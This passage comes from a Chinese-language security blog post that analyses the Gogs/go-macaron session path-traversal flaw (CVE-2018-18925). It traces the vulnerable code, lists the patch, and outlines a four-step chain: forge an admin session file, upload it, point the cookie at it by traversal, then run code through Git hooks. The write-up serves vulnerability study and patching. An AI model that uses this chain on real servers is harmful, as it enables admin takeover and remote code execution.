class="hljs-constructor">Sessioner()</span><br>csrf.<span class="hljs-constructor">Csrfer()</span><br>toolbox.<span class="hljs-constructor">Toolboxer()</span><br></code></pre></td></tr></table></figure>
+
+<p>在这个函数中，就有 session 相关操作，代码定位到 <code>web.go</code> 的 147 行，跟进到 <code>session.Sessioner()</code> 函数当中。这个函数根据传入的配置项初始化一个 <code>option</code>，然后返回一个函数供中间件使用，在每次请求正式发生之前，都会调用这个 session 鉴权函数。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/14.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>继续跟进到 <code>Start()</code> 函数里面。自此，代码进入到了漏洞触发阶段。首先读取 web 浏览器端存储的 cookie，可以看到，标识身份与 session 有关的 cookie 名是 <code>i_like_gogits</code>,这也是为什么之前我们复现时使用这个 cookie 名的原因，而这个配置项的具体位置在 <code>conf/app.ini</code> 文件里面，可以自定义身份 cookie 名。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/15.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>接着跟进到 <code>m.provider.Exist()</code> 函数中，最终通过 cookie 的值，结合 <code>filepath()</code> 函数拼接具体存储 seesion 文件路径，通过函数 <code>Isfile()</code> 判断此 session 文件是否存在从而达到基本的 session 鉴权目的:</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/16.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>可以看到，文件路径只是简单的拼接了 <code>p.rootPath</code>, <code>sid[0]</code>, <code>sid[1]</code>,<code>sid</code> 四个字符串，其中 <code>sid</code> 是用户直接可控的，而 <code>rootPath</code> 默认是 <code>data/session</code>，代码中并未对跨目录符号进行筛查，直接进行拼接。那我们可以通过生成类管理员的 session 文件，结合上传点确定上传路径，修改 cookie 即可越权以管理员身份登录了。<strong>所以说这个漏洞可以扩展到任何一个使用了指定版本 <code>go-macaron</code> 框架，且存在文件上传点的应用当中。</strong>越权之后可以结合用户钩子的正常功能点来 getshell。</p>
+<h2 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5@ 修复方案"></a>5@ 修复方案</h2><p>Gogs 可至 Github 下载编译 develop 分支，在此分支中此漏洞已经修复。</p>
+<p>Gitea 更新至 1.5.4 版本即可。</p>
+<p><code>gogs</code> 官方补丁中，在 <code>Read()</code> 操作中判定参数 <code>sid</code> 中，是否包括了 <code>./</code> 字符，存在返回格式错误。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/18.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6@ 总结"></a>6@ 总结</h2><p>首先梳理下整个系统的启动与鉴权时机:</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/21.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>然后梳理下整个漏洞利用流程:</p>
+<blockquote>
+<p>1、通过 gob 脚本生成管理员 session 文件。</p>
+<p>2、通过 release 发布文件，得到文件路径。</p>
+<p>3、通过文件路径构造 cookie，指定 i_like_gogits 字段，格式为 ..&#x2F;attachments&#x2F;文件名[1]&#x2F;文件名[2]&#x2F;文件名。</p>
+<p>4、成功登陆管理员，利用 Git 钩子执行代码。</p>
+</blockquote>
+<p>挖洞小 tips :</p>
+<blockquote>
+<p>如果系统以文件形式存储 session 身份文件，可以通过阅读目标代码观察读取文件时是否存在跨目录读的情况，这样我们结合上传点和 session 文件格式可以实现简单的越权。</p>
+</blockquote>
+<p>Reference:</p>
+<p>环境搭建:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//g</span>ogs.io<span class="hljs-regexp">/docs/i</span>nstallation/install_from_source.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_39003229/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">97638573</span><br>https:<span class="hljs-regexp">//g</span>oproxy.io<span class="hljs-regexp">/zh/</span><br>https:<span class="hljs-regexp">//</span>studygolang.com<span class="hljs-regexp">/articles/</span><span class="hljs-number">18405</span><br>https:<span class="hljs-regexp">//</span>blog.mynook.info<span class="hljs-regexp">/post/</span>host-your-own-git-server-using-gogs/<br>https:<span class="hljs-regexp">//</span>studygolang.com<span class="hljs-regexp">/articles/</span><span class="hljs-number">22075</span>?fr=sidebar<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gogs/g</span>ogs<span class="hljs-regexp">/issues/</span><span class="hljs-number">3911</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞参考:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">知弦学长友情 pdf<br>https:<span class="hljs-regexp">//</span>nvd.nist.gov<span class="hljs-regexp">/vuln/</span>detail/CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">18925</span><br>https:<span class="hljs-regexp">//</span>cert.<span class="hljs-number">360</span>.cn<span class="hljs-regexp">/warning/</span>detail?id=a38d5b163778e50b83ccc7953074edfa<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/tree/m</span>aster<span class="hljs-regexp">/gogs/</span>CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">18925</span><br>https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">163575</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">3168</span><br></code></pre></td></tr></table></figure>
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>rt</li>
+    <li><strong>本文链接：</strong><a href="https://rt-95.github.io/2020/12/11/Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html" title="https:&#x2F;&#x2F;rt-95.github.io&#x2F;2020&#x2F;12&#x2F;11&#x2F;Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&#x2F;index.html">https:&#x2F;&#x2F;rt-95.github.io&#x2F;2020&#x2F;12&#x2F;11&#x2F;Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+        
+  <nav class="nav">
+    <a href="/2021/01/19/%E8%A7%84%E9%81%BF%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20&%20JSONP%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/"><i class="iconfont iconleft"></i>规避浏览器同源策略 & JSONP的原理和利用</a>
+    <a href="/2020/12/10/Go%20%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%94%E8%AE%B0/">Go 语言知识点笔记<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+<div id="valine"></div>
+<script defer src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  window.onload = function () {
+    var loadValine = function () {
+      new Valine({
+        el: '#valine',
+        app_id: "2p9C8apOcLBToxgiqqnJtF5v-gzGzoHsz",
+        app_key: "r9A7GDDCd5SSLNdlcwqxdjvR",
+        placeholder: "说点什么吧",
+        avatar: "mp",
+        pageSize: "10",
+        lang: "zh-CN",
+      });
+    }
+    if ( true ) {
+      $("#comments-btn").on("click", function () {
+        $(this).hide();
+        loadValine();
+      });
+    } else {
+      loadValine();
+    }
+  };
+</script>
+
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80"><span class="toc-text">1@ 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">2@ 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD"><span class="toc-text">2.1 源码下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91"><span class="toc-text">2.2 源码编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-web-%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA"><span class="toc-text">2.3 web 服务搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8-Goland-%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"><span class="toc-text">3@ 使用 Goland 进行调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">4@ 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">4.1 漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">4.2 漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-text">4.3 漏洞调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">5@ 修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%80%BB%E7%BB%93"><span class="toc-text">6@ 总结</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="https://github.com/59lx "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="https://weibo.com/u/6479214985 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#00cc99" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconweibo"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">rt</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
